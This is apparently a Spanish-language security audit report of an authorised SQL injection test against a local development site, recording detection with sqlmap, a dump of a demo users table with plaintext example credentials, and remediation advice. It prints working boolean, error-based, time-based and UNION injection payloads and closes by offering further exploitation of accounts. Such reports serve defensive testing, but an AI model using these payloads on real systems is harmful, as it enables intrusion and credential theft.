# Informe de auditoría — SQL Injection

Fecha: 2026-04-08T14:51:58Z
Objetivo: http://web.dev.local:8083
Autorización: concedida por el usuario (análisis autorizado)

Resumen ejecutivo
-----------------
Se detectó y explotó una vulnerabilidad de SQL Injection en el parámetro GET `id`. Se extrajo la tabla `users` de la base de datos `sqli_demo` con 8 entradas, incluyendo credenciales en texto claro.

Hallazgos técnicos
------------------
- Parámetro vulnerable: id (GET)
- Tipos de inyección detectados: boolean-based blind, error-based, time-based (SLEEP), UNION-based
- DBMS: MySQL/MariaDB (detectado)
- Webserver: Apache sobre Linux; aplicación en PHP 8.1

Payloads PoC (ejemplos extraídos de sqlmap)
------------------------------------------
- Boolean-based: id=2445' AND 1167=(SELECT (CASE WHEN (1167=1167) THEN 1167 ELSE (SELECT 7891 UNION SELECT 8425) END))-- -&Submit=Submit
- Error-based (FLOOR concat): id=2445' OR (SELECT 6357 FROM(SELECT COUNT(*),CONCAT(0x717a707171,(SELECT (ELT(6357=6357,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'qQAj'='qQAj&Submit=Submit
- Time-based (SLEEP): id=2445' AND (SELECT 6550 FROM (SELECT(SLEEP(5)))TqdE) AND 'KBNb'='KBNb&Submit=Submit
- UNION-based: id=2445' UNION ALL SELECT NULL,CONCAT(0x717a707171,0x4769... ,0x7162716b71)-- -&Submit=Submit

Datos extraídos
---------------
Base: sqli_demo
Tabla: users (8 filas)
Contenido (resumen):
| user_id | email               | password    | username  |
| 1       | admin@example.com   | password123 | admin     |
| 2       | jane@example.com    | secret456   | jsmith    |
| ...     | ...                 | ...         | ...       |
El volcado completo se guardó en: /home/kali_rdp/.local/share/sqlmap/output/web.dev.local/dump/sqli_demo/users.csv

Impacto
-------
- Compromiso de confidencialidad: credenciales en texto claro divulgadas
- Compromiso de integridad/autenticación: acceso potencial a cuentas (p. ej. admin)

Acciones realizadas
-------------------
- Detección y confirmación de inyección SQL en `id`
- Enumeración de bases de datos y tablas
- Volcado completo de la tabla `sqli_demo.users` usando sqlmap
- Salida y artefactos localizados en la máquina de auditoría (sqlmap output)

Recomendaciones
---------------
1. Usar consultas parametrizadas (prepared statements) en todas las entradas de SQL.
2. Validación y saneamiento de entrada en servidor; rechazar entradas no esperadas.
3. Aplicar principio de menor privilegio al usuario DB (evitar cuentas con SELECT/FILE/ADMIN si no necesarias).
4. Reforzar almacenamiento de contraseñas: usar hashing fuerte (bcrypt/argon2) con sal.
5. Revisar y rotar credenciales expuestas (p. ej. admin@example.com).
6. Monitorizar y aplicar WAF reglas para bloquear patrones de inyección.
7. Actualizar dependencias y revisiones de seguridad del código PHP.

Artefactos y referencias
------------------------
- sqlmap output dir (auditor): /home/kali_rdp/.local/share/sqlmap/output/web.dev.local
- CSV dump: /home/kali_rdp/.local/share/sqlmap/output/web.dev.local/dump/sqli_demo/users.csv
- Log parcial almacenado en: /tmp/sqlmap-web-dev-8083/web.dev.local/log

Notas finales
------------
Análisis realizado con sqlmap (automático). Si se desea, pueden solicitarse PoC adicionales, explotación de cuentas o pruebas de mitigación controlada.
